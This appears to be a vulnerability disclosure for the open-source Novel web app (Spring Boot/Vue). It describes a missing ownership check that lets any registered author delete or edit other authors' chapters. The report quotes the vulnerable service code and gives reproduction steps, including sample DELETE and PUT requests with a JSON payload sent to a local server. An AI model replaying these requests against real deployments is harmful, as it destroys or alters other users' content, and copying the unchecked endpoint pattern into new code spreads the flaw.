# Novel  has a logic authorization bypass vulnerability in AuthorController





## Project Version & Introduction

**V3.5.0 / Released on February 20, 2025**

**Novel** is a learning-oriented novel project developed using the latest Java tech stack — Spring Boot 3 and Vue 3 — with a front-end and back-end separation architecture. It comes with a beginner-friendly, step-by-step tutorial to help you build and deploy a production-grade Java system from scratch.

The project consists of several subsystems, including a novel portal system, an author backend management system, and a platform backend management system. It features novel recommendations, work search, ranking lists, reading interface, novel comments, member center, author zone, recharge and subscription, news publishing, and more.

![image-20250415204119418](/assest/novel/1.png)





## Deployment

Download backend source code: 
 https://github.com/201206030/novel

Download frontend source code:
 https://github.com/201206030/novel-front-web

For detailed instructions, see:
 [https://docs.xxyopen.com/course/novel/#%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4](https://docs.xxyopen.com/course/novel/#安装步骤)



## Vulnerability Analysis



### Delete novel chapter



**Located in the file**

`src/main/java/io/github/xxyopen/novel/controller/author/AuthorController.java`

![image-20250415210231786](/assest/novel/2.png)



Tracing to the `impl` layer reveals that, unlike other interfaces, it does not perform thread-level user authentication. As a result, authentication is solely handled by the `AuthorAuthStrategy`, which only verifies author identity.

`src/main/java/io/github/xxyopen/novel/service/impl/BookServiceImpl.java`

```java
@Transactional(rollbackFor = Exception.class)
    @Override
    public RestResp<Void> deleteBookChapter(Long chapterId) {
        // 1.查询章节信息
        BookChapterRespDto chapter = bookChapterCacheManager.getChapter(chapterId);
        // 2.查询小说信息
        BookInfoRespDto bookInfo = bookInfoCacheManager.getBookInfo(chapter.getBookId());
        // 3.删除章节信息
        bookChapterMapper.deleteById(chapterId);
        // 4.删除章节内容
        QueryWrapper<BookContent> bookContentQueryWrapper = new QueryWrapper<>();
        bookContentQueryWrapper.eq(DatabaseConsts.BookContentTable.COLUMN_CHAPTER_ID, chapterId);
        bookContentMapper.delete(bookContentQueryWrapper);
        // 5.更新小说信息
        BookInfo newBookInfo = new BookInfo();
        newBookInfo.setId(chapter.getBookId());
        newBookInfo.setUpdateTime(LocalDateTime.now());
        newBookInfo.setWordCount(bookInfo.getWordCount() - chapter.getChapterWordCount());
        if (Objects.equals(bookInfo.getLastChapterId(), chapterId)) {
            // 设置最新章节信息
            QueryWrapper<BookChapter> bookChapterQueryWrapper = new QueryWrapper<>();
            bookChapterQueryWrapper.eq(DatabaseConsts.BookChapterTable.COLUMN_BOOK_ID, chapter.getBookId())
                .orderByDesc(DatabaseConsts.BookChapterTable.COLUMN_CHAPTER_NUM)
                .last(DatabaseConsts.SqlEnum.LIMIT_1.getSql());
            BookChapter bookChapter = bookChapterMapper.selectOne(bookChapterQueryWrapper);
            Long lastChapterId = 0L;
            String lastChapterName = "";
            LocalDateTime lastChapterUpdateTime = null;
            if (Objects.nonNull(bookChapter)) {
                lastChapterId = bookChapter.getId();
                lastChapterName = bookChapter.getChapterName();
                lastChapterUpdateTime = bookChapter.getUpdateTime();
            }
            newBookInfo.setLastChapterId(lastChapterId);
            newBookInfo.setLastChapterName(lastChapterName);
            newBookInfo.setLastChapterUpdateTime(lastChapterUpdateTime);
        }
        bookInfoMapper.updateById(newBookInfo);
        // 6.清理章节信息缓存
        bookChapterCacheManager.evictBookChapterCache(chapterId);
        // 7.清理章节内容缓存
        bookContentCacheManager.evictBookContentCache(chapterId);
        // 8.清理小说信息缓存
        bookInfoCacheManager.evictBookInfoCache(chapter.getBookId());
        // 9.发送小说信息更新的 MQ 消息
        amqpMsgManager.sendBookChangeMsg(chapter.getBookId());
        return RestResp.ok();
    }
```

Correct Approach

![image-20250415210510506](/assest/novel/3.png)



### Update Novel Chapter

The same issue exists in the update interface.

`AuthorController`  -> `updateBookChapter`

```java
    /**
     * 小说章节更新接口
     */
    @Operation(summary = "小说章节更新接口")
    @PutMapping("book/chapter/{chapterId}")
    public RestResp<Void> updateBookChapter(
        @Parameter(description = "章节ID") @PathVariable("chapterId") Long chapterId,
        @Valid @RequestBody ChapterUpdateReqDto dto) {
        return bookService.updateBookChapter(chapterId, dto);
    }
```

`Impl`  : `BookServiceImpl.updateBookChapter`

```
 @Transactional
    @Override
    public RestResp<Void> updateBookChapter(Long chapterId, ChapterUpdateReqDto dto) {
        // 1.查询章节信息
        BookChapterRespDto chapter = bookChapterCacheManager.getChapter(chapterId);
        // 2.查询小说信息
        BookInfoRespDto bookInfo = bookInfoCacheManager.getBookInfo(chapter.getBookId());
        // 3.更新章节信息
        BookChapter newChapter = new BookChapter();
        newChapter.setId(chapterId);
        newChapter.setChapterName(dto.getChapterName());
        newChapter.setWordCount(dto.getChapterContent().length());
        newChapter.setIsVip(dto.getIsVip());
        newChapter.setUpdateTime(LocalDateTime.now());
        bookChapterMapper.updateById(newChapter);
        // 4.更新章节内容
        BookContent newContent = new BookContent();
        newContent.setContent(dto.getChapterContent());
        newContent.setUpdateTime(LocalDateTime.now());
        QueryWrapper<BookContent> bookContentQueryWrapper = new QueryWrapper<>();
        bookContentQueryWrapper.eq(DatabaseConsts.BookContentTable.COLUMN_CHAPTER_ID, chapterId);
        bookContentMapper.update(newContent, bookContentQueryWrapper);
        // 5.更新小说信息
        BookInfo newBookInfo = new BookInfo();
        newBookInfo.setId(chapter.getBookId());
        newBookInfo.setUpdateTime(LocalDateTime.now());
        newBookInfo.setWordCount(
            bookInfo.getWordCount() - chapter.getChapterWordCount() + dto.getChapterContent().length());
        if (Objects.equals(bookInfo.getLastChapterId(), chapterId)) {
            // 更新最新章节信息
            newBookInfo.setLastChapterName(dto.getChapterName());
            newBookInfo.setLastChapterUpdateTime(LocalDateTime.now());
        }
        bookInfoMapper.updateById(newBookInfo);
        // 6.清理章节信息缓存
        bookChapterCacheManager.evictBookChapterCache(chapterId);
        // 7.清理章节内容缓存
        bookContentCacheManager.evictBookContentCache(chapterId);
        // 8.清理小说信息缓存
        bookInfoCacheManager.evictBookInfoCache(chapter.getBookId());
        // 9.发送小说信息更新的 MQ 消息
        amqpMsgManager.sendBookChangeMsg(chapter.getBookId());
        return RestResp.ok();
    }
```



## Vulnerability Verification



**Note**:  Pre-register as an author using any arbitrary identity.  Then login.



### Delete novel chapter

By opening any novel and loading the chapter directory, the complete list of chapter `id`s can be obtained.

![image-20250415210725080](/assest/novel/4.png)

Test in Postman (DELETE request) using an arbitrary author identity token.

```http
# chapter/{chapterId}
http://127.0.0.1:8888/api/author/book/chapter/1337924134911365120
```

![image-20250415210933468](/assest/novel/5.png)

Return to the chapter list and refresh — the deletion is successful.

![image-20250415211012381](/assest/novel/6.png)



### Update Novel Chapter



**Chapter ID is obtained using the same method as before.**

**Construct a PUT request in Postman.**

```http
# chapter/{chapterId}
http://127.0.0.1:8888/api/author/book/chapter/1337751287857459200
```

paylaod

```json
{
    "chapterName": "章节名测试",
    "chapterContent": "测试11111111111111111111111111111111111111111111111111111111",
    "isVip": "0"
}
```

![image-20250415211139389](/assest/novel/7.png)



![image-20250415211149202](/assest/novel/8.png)



![image-20250415211156189](/assest/novel/9.png)



































